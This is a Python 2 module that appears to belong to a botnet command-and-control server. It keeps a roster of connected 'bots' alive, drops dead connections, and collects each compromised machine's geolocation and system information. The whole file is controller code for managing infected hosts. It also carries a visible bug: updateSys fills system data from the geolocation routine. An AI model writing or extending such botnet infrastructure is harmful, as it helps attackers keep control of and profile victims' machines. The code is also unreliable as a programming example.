# Date: 10/21/2017
# Author: Ethical-H4CK3R
# Description: Pings Every Bot

import time 
import socket
import threading
from Queue import Queue

class Ping(object):
 ''' Disconnects dead connecetions '''
 
 def __init__(self):
  self.dead = Queue()

 def connection(self, bot):
  try:bot.session.recv(1) 
  except socket.timeout:return
  except:self.dead.put(bot)
  
 def dropDead(self):
  while self.ping:
   while not self.dead.empty():
    if self.wait:
     while self.ping and self.wait:pass
     time.sleep(5)
    self.killBot(self.dead.get())
    
 def updateGeo(self, bot):
  for value in bot.location:
   try:
    if not bot.location[value]:
     bot.location = self.geo(bot.session)
     return
   except:return

 def updateSys(self, bot):
  for value in bot.system:
   try:
    if not bot.system[value]:
     bot.system = self.geo(bot.session)
     return
   except:return  

 def reviewGeo(self, bot):
  if not bot.location:
   bot.location = self.geo(bot.session)
  else:self.updateGeo(bot) 

 def reviewInfo(self, bot):
  if not bot.system:
   bot.system = self.sys(bot.session)
  else:self.updateSys(bot)

 def examine(self, bot):
  self.connection(bot)
  self.reviewInfo(bot)
  self.reviewGeo(bot)
      
 def startPing(self):
  threading.Thread(target=self.dropDead).start()
  while self.ping:
   if not len(self.botnet):continue
   [time.sleep(1) for _ in range(10) if self.ping]
   for bot in self.botnet:
    while self.ping and self.wait:pass
    if self.ping:self.examine(bot)
